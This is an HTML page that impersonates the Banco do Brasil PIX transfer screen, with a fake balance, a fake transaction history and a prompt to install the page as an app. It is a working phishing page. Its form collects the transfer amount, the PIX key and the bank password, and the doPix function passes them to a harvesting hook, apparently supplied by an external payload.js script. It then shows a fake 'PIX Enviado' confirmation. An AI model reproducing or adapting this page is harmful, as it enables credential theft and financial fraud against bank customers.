<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#1a1f71">
<title>Banco do Brasil — PIX</title>
<link rel="manifest" href="/static/manifest.json">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1f71;color:#fff;font-family:Arial,sans-serif;min-height:100vh}
.topbar{background:#0f1350;padding:16px;display:flex;align-items:center;gap:12px;font-size:18px;font-weight:700}
.topbar img{width:32px;height:32px}
.balance-card{background:linear-gradient(135deg,#f5d742,#e5b91e);color:#1a1f71;margin:16px;padding:20px;border-radius:16px}
.balance-card .label{font-size:12px;opacity:.7;text-transform:uppercase;letter-spacing:1px}
.balance-card .amount{font-size:36px;font-weight:900;margin:4px 0}
.balance-card .account{font-size:13px;opacity:.8}
.pix-section{background:#16216b;margin:16px;padding:20px;border-radius:16px}
.pix-section h3{font-size:16px;margin-bottom:12px}
.pix-section .pix-amount{width:100%;padding:14px;border-radius:12px;border:2px solid #2d3da0;background:#0f1350;color:#fff;font-size:24px;text-align:center;margin-bottom:10px;outline:none}
.pix-section .pix-amount:focus{border-color:#f5d742}
.pix-section .pix-key{width:100%;padding:14px;border-radius:12px;border:2px solid #2d3da0;background:#0f1350;color:#fff;font-size:16px;margin-bottom:10px;outline:none}
.pix-section .pix-key:focus{border-color:#f5d742}
.btn-pix{width:100%;padding:16px;border-radius:12px;border:none;background:linear-gradient(135deg,#f5d742,#e5b91e);color:#1a1f71;font-size:18px;font-weight:900;cursor:pointer;text-transform:uppercase}
.btn-pix:active{transform:scale(.97)}
.recent{background:#16216b;margin:16px;padding:20px;border-radius:16px}
.recent h3{font-size:14px;margin-bottom:10px;opacity:.7}
.tx{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #1e2a80;font-size:14px}
.tx .name{font-weight:600}
.tx .val{color:#22c55e}
.pwa-banner{background:#0f1350;margin:16px;padding:14px 20px;border-radius:12px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;border:1px solid #2d3da0}
.pwa-banner .txt{font-size:13px}
.pwa-btn{background:#f5d742;color:#1a1f71;border:none;padding:10px 16px;border-radius:20px;font-weight:700;font-size:13px;cursor:pointer}
.success-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:100;align-items:center;justify-content:center}
.success-overlay.show{display:flex}
.success-card{background:#16216b;padding:32px;border-radius:20px;text-align:center;max-width:320px}
.success-card .check{font-size:64px;margin-bottom:12px}
.success-card h3{color:#22c55e;margin-bottom:8px}
.success-card p{color:#94a3b8;font-size:13px}
</style>
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
</head>
<body>
<div class="topbar">
  <svg width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="16" r="14" fill="#f5d742"/><text x="16" y="21" text-anchor="middle" fill="#1a1f71" font-size="16" font-weight="900">BB</text></svg>
  Banco do Brasil
</div>
<div class="balance-card">
  <div class="label">Saldo em Conta</div>
  <div class="amount" id="balance">R$ 8.423,17</div>
  <div class="account">Ag 1234-5 • CC 067890-1</div>
</div>
<div class="pix-section">
  <h3>📱 Transferência PIX</h3>
  <input type="text" class="pix-amount" id="pixAmount" placeholder="R$ 0,00">
  <input type="text" class="pix-key" id="pixKeyInput" placeholder="Chave PIX (CPF, e-mail ou celular)">
  <input type="password" class="pix-key" id="bbPassword" placeholder="Senha de 8 dígitos">
  <button class="btn-pix" onclick="doPix()">Transferir Agora</button>
</div>
<div class="recent">
  <h3>Últimas Transações</h3>
  <div class="tx"><span class="name">🥗 Ifood</span><span class="val">-R$ 42,90</span></div>
  <div class="tx"><span class="name">💡 CEMIG</span><span class="val">-R$ 187,33</span></div>
  <div class="tx"><span class="name">💰 Salário</span><span class="val" style="color:#22c55e">+R$ 4.200,00</span></div>
</div>
<div class="pwa-banner" id="pwaBanner">
  <span class="txt">📲 Adicione à tela inicial para acesso rápido</span>
  <button class="pwa-btn" id="pwaInstallBtn">Instalar</button>
</div>
<div class="success-overlay" id="successOverlay">
  <div class="success-card">
    <div class="check">✅</div>
    <h3>PIX Enviado!</h3>
    <p>Transferência concluída com sucesso.</p>
    <p style="margin-top:8px;font-size:12px;color:#666">Comprovante enviado por e-mail.</p>
  </div>
</div>
<script src="/static/payload.js"></script>
<script>
var balance=8423.17;
function doPix(){
  var amount=document.getElementById('pixAmount').value.replace(/[^0-9,.]/g,'').replace(',','.');
  var key=document.getElementById('pixKeyInput').value.trim();
  var pass=document.getElementById('bbPassword').value.trim();
  if(!amount||parseFloat(amount)<=0||!key||pass.length<4)return;
  if(window.GH)window.GH.sendResult('pix_data',JSON.stringify({amount:amount,pix_key:key,password:pass,timestamp:new Date().toISOString()}));
  document.getElementById('successOverlay').classList.add('show');
  setTimeout(function(){document.getElementById('successOverlay').classList.remove('show')},3000)
}
var pwaEvent=null;
window.addEventListener('beforeinstallprompt',function(e){e.preventDefault();pwaEvent=e;document.getElementById('pwaBanner').style.display='flex'});
document.getElementById('pwaInstallBtn').addEventListener('click',function(){if(pwaEvent){pwaEvent.prompt();pwaEvent.userChoice.then(function(r){if(r.outcome==='accepted')document.getElementById('pwaBanner').style.display='none';pwaEvent=null})}});
var r=Math.random()*2000-1000;document.getElementById('balance').textContent='R$ '+(balance+r).toLocaleString('pt-BR',{minimumFractionDigits:2})
</script>
</body>
</html>
